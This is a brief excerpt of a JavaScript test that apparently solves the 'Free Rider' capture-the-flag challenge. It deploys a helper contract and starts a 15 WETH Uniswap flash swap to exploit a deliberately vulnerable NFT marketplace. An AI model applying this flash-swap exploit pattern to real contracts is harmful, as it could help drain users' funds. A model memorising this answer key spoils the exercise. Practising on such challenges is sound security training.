...
describe('[Challenge] Free Rider', function () {
  ...
  it('Execution', async function () {
    ...
    // Deploy FreeRiderHelper
    const freeRiderHelper = await (await ethers.getContractFactory('FreeRiderHelper', player)).deploy(uniswapPair.address, weth.address, marketplace.address, nft.address, devsContract.address, player.address);

    // Need to borrow 15 WETH, fee is 0.045 WETH
    await weth.connect(player).deposit({ value: 50n * 10n ** 15n });
    await weth.connect(player).approve(freeRiderHelper.address, 50n * 10n ** 15n);

    await freeRiderHelper.connect(player).flashSwap(15n * 10n ** 18n);
  });
